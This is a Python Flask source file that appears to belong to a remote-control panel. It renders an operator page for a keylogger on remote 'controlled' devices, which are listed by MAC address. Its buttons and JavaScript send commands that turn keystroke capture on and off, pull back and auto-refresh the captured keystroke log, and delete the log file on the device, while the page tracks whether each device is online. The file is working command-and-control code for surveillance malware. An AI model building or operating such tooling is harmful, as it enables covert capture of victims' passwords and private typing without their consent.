from flask import Blueprint, render_template_string, session, redirect, url_for
from core import clients_db

try:
    from ui import ADMIN_CSS
except Exception:
    ADMIN_CSS = ""

bp = Blueprint('keylog', __name__)


@bp.route('/keylog/<mac>')
def view_keylog(mac):
    if not session.get('logged_in'):
        return redirect(url_for('auth.login'))
    if mac not in clients_db:
        return "设备不存在"

    info = clients_db[mac]
    html = """
    <!DOCTYPE html>
    <html lang="zh-CN">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <title>Key log - {{ info.name }}</title>
        <style>
            {{ admin_css|safe }}
            .device-meta { display:flex; flex-wrap:wrap; gap:8px; margin-top:8px; color:var(--muted); font-size:13px; }
            .status-pill { display:inline-flex; align-items:center; min-height:30px; border-radius:999px; padding:5px 10px; color:#fff; font-size:13px; font-weight:700; }
            .status-on { background:var(--green); }
            .status-off { background:var(--red); }
            .status-muted { background:var(--slate); }
            .keylog-actions { display:flex; flex-wrap:wrap; gap:8px; align-items:center; margin-top:14px; }
            .keylog-actions label { display:inline-flex; align-items:center; gap:7px; margin:0; color:var(--text); border:1px solid var(--line); background:#fff; border-radius:6px; padding:8px 10px; min-height:36px; cursor:pointer; }
            .log-box { width:100%; min-height:56vh; max-height:70vh; overflow:auto; margin-top:14px; background:#0b1020; color:#bbf7d0; border:1px solid #1f2937; border-radius:8px; padding:14px; font:13px/1.55 Consolas, "Cascadia Mono", monospace; white-space:pre-wrap; word-break:break-word; box-shadow:inset 0 1px 0 rgba(255,255,255,.04); }
            .log-box.loading { color:#93c5fd; }
            @media(max-width:640px){
                .keylog-actions button, .keylog-actions label, .topbar .btn { flex:1 1 100%; justify-content:center; text-align:center; }
                .log-box { min-height:52vh; max-height:none; font-size:12px; padding:11px; }
                .device-meta { font-size:12px; }
            }
        </style>
    </head>
    <body>
        <main class="shell">
            <div class="topbar">
                <div class="title">
                    <h1>Keyboard Log</h1>
                    <p>查看本机键盘记录状态和最近回传内容。</p>
                    <div class="device-meta">
                        <span>{{ info.name }}</span>
                        <code>{{ mac }}</code>
                        <span>{{ info.ip }}</span>
                    </div>
                </div>
                <div class="toolbar compact">
                    {% set initial_on = info.get("kl", "0") == "1" %}
                    <span id="kl-status" class="status-pill {{ 'status-on' if initial_on else 'status-off' }}">{{ 'Offline logging on' if initial_on else 'Offline logging off' }}</span>
                    <a class="btn muted" href="/">Back</a>
                </div>
            </div>

            <section class="panel">
                <div class="section-head">
                    <div>
                        <h2>Capture Control</h2>
                        <p>开启后客户端会在本地持续记录，设备上线后可拉取查看。</p>
                    </div>
                </div>
                <div class="keylog-actions">
                    <button class="ok" onclick="sendCtrl('KEYENABLE:1')">Enable local log</button>
                    <button class="warn" onclick="sendCtrl('KEYDISABLE:1')">Disable local log</button>
                    <label><input type="checkbox" id="auto-refresh" onchange="toggleAutoRefresh(this.checked)"> Auto refresh</label>
                    <button onclick="sendCtrl('KEYLOG_GET:1', false)">Fetch latest</button>
                    <button class="danger" onclick="if(confirm('Clear local key log file?')) sendCtrl('KEYLOG_DEL:1', false)">Clear local file</button>
                </div>
            </section>

            <section class="panel">
                <div class="section-head">
                    <div>
                        <h2>Returned Log</h2>
                        <p>内容来自客户端本地文件，拉取成功后会自动滚动到底部。</p>
                    </div>
                </div>
                <div class="log-box" id="log-content">Waiting for command...</div>
            </section>
        </main>

        <script>
            let pollInterval;
            let autoRefreshInterval = null;
            const logBox = document.getElementById('log-content');

            function setLogText(text, loading = false) {
                logBox.innerText = text;
                logBox.classList.toggle('loading', loading);
            }

            function sendCtrl(cmdStr, silent = false) {
                if (!silent) setLogText('正在下发指令: ' + cmdStr + ' ...', true);

                if(pollInterval) {
                    clearInterval(pollInterval);
                    pollInterval = null;
                }

                fetch('/api/file/cmd', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({mac: '{{ mac }}', cmd: 'F_CMD:' + cmdStr})
                }).then(() => {
                    if (!silent) setLogText('指令已下发，请稍等几秒钟，正在尝试从受控端回传最新的输出...', true);
                    pollResult(silent);
                });
            }

            function pollResult(silent) {
                let count = 0;
                pollInterval = setInterval(() => {
                    fetch('/api/file/result/{{ mac }}')
                    .then(r => r.json())
                    .then(data => {
                        if (data.status === 'ready') {
                            setLogText(data.data || '(empty)');
                            logBox.scrollTop = logBox.scrollHeight;
                            clearInterval(pollInterval);
                            pollInterval = null;
                        }
                    });
                    count++;
                    if(count > 15) {
                        clearInterval(pollInterval);
                        pollInterval = null;
                        if(!silent && logBox.innerText.includes('正在尝试')) setLogText(logBox.innerText + '\\n\\n等待超时，可能设备离线或网络质量较差。');
                    }
                }, 2000);
            }

            function toggleAutoRefresh(checked) {
                if(checked) {
                    if(!autoRefreshInterval) {
                        autoRefreshInterval = setInterval(() => {
                            if(!pollInterval) {
                                sendCtrl('KEYLOG_GET:1', true);
                            }
                        }, 3000);
                        sendCtrl('KEYLOG_GET:1', true);
                    }
                } else {
                    if(autoRefreshInterval) {
                        clearInterval(autoRefreshInterval);
                        autoRefreshInterval = null;
                    }
                }
            }

            setInterval(() => {
                fetch('/api/ping/{{ mac }}')
                .then(r => r.json())
                .then(data => {
                    let st = document.getElementById('kl-status');
                    if (data.status === 'online') {
                        if (data.kl === '1') {
                            st.innerText = 'Offline logging on';
                            st.className = 'status-pill status-on';
                        } else {
                            st.innerText = 'Offline logging off';
                            st.className = 'status-pill status-off';
                        }
                    } else {
                        st.innerText = 'Device offline';
                        st.className = 'status-pill status-muted';
                    }
                }).catch(e => console.error(e));
            }, 3000);
        </script>
    </body>
    </html>
    """
    return render_template_string(html, admin_css=ADMIN_CSS, mac=mac, info=info)
